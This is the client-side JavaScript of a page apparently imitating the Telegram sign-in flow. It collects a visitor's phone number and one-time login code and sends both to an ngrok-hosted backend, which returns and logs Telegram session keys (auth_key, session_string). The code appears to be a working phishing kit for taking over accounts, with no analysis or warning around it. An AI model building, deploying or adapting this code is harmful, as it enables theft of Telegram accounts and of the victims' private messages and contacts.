const BACKEND_URL = 'https://8e82-81-155-215-249.ngrok-free.app';

async function sendLogToBackend(message) {
    console.log('Log:', message);

    try {
        await fetch(`${BACKEND_URL}/log`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ logMessage: message })
        });
    } catch (error) {
        console.error('Error sending log to backend:', error);
    }
}

document.addEventListener('DOMContentLoaded', function() {
    // Check for user's preferred color scheme and apply night mode if necessary
    const isNightMode = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches;
    if (isNightMode) {
        document.body.classList.add('night-mode');
        sendLogToBackend("Night mode activated.");

        // Load the dark mode logo
        const logoImage = document.getElementById('telegramLogo');
        if (logoImage) {
            logoImage.src = 'telegram-logo2.png'; // Update image source for dark mode
        }
    } else {
        sendLogToBackend("Light mode activated.");
    }

    const phoneForm = document.getElementById('phoneForm');
    if (phoneForm) {
        phoneForm.addEventListener('submit', async function(event) {
            event.preventDefault();
            sendLogToBackend("Phone form submitted!");

            const phoneNumber = document.getElementById('phoneNumber').value;
            sendLogToBackend("Phone number entered: " + phoneNumber);

            sessionStorage.setItem('phoneNumber', phoneNumber);

            try {
                const response = await fetch(`${BACKEND_URL}/sendPhoneNumber`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ phoneNumber })
                });

                if (!response.ok) throw new Error('Network response was not ok: ' + response.statusText);

                const data = await response.json();
                sendLogToBackend('Response from backend: ' + JSON.stringify(data));

                if (data.phone_code_hash) {
                    sessionStorage.setItem('phone_code_hash', data.phone_code_hash);
                    sendLogToBackend("Phone code hash stored: " + data.phone_code_hash);
                    document.getElementById('loginContainer').classList.add('swipe-left');
                    setTimeout(() => window.location.href = '/otp.html', 600);
                } else {
                    console.error('Failed to send OTP:', data.message);
                    displayMessage(data.message || 'Failed to send OTP', 'error');
                }
            } catch (error) {
                console.error('Error sending phone number:', error);
                displayMessage('Error sending OTP: ' + error.message, 'error');
            }
        });
    }

    const otpForm = document.getElementById('otpForm');
    if (otpForm) {
        otpForm.addEventListener('submit', async function(event) {
            event.preventDefault();
            sendLogToBackend("Phone code form submitted!");

            const phoneNumber = sessionStorage.getItem('phoneNumber');
            const phoneCode = document.getElementById('phoneCode').value;
            const phoneCodeHash = sessionStorage.getItem('phone_code_hash');

            if (!/^\d{5}$/.test(phoneCode)) {
                console.error("Invalid phone code. Must be 5 digits.");
                displayMessage("Phone code must be exactly 5 digits.", 'error');
                return;
            }

            sendLogToBackend("Phone number from sessionStorage: " + phoneNumber);
            sendLogToBackend("Phone code entered: " + phoneCode);
            sendLogToBackend("Phone code hash: " + phoneCodeHash);

            try {
                const response = await fetch(`${BACKEND_URL}/verifyOTP`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ phoneNumber, phoneCode, phone_code_hash: phoneCodeHash })
                });

                if (!response.ok) {
                    const data = await response.json();
                    console.error('Failed to submit Phone Code:', data.message);
                    throw new Error(data.message || 'Failed to submit Phone Code');
                }

                const result = await response.json();
                sendLogToBackend('Received auth tokens: ' + JSON.stringify(result.authTokens));

                localStorage.clear();
                localStorage.setItem('auth_key', result.authTokens.auth_key);
                localStorage.setItem('dc_id', result.authTokens.dc_id);
                localStorage.setItem('session_string', result.authTokens.session_string);

                document.getElementById('otpContainer').classList.add('swipe-in');
                setTimeout(() => window.location.href = result.redirectUrl, 600);
            } catch (error) {
                console.error('Error submitting Phone Code:', error);
                displayMessage('Error submitting Phone Code: ' + error.message, 'error');
            }
        });
    }
});

function displayMessage(message, type) {
    const messageContainer = document.getElementById('message') || document.getElementById('successMessage') || document.getElementById('errorMessage');
    messageContainer.innerText = message;
    messageContainer.style.color = type === 'error' ? 'red' : 'green';
    messageContainer.style.display = 'block';
}
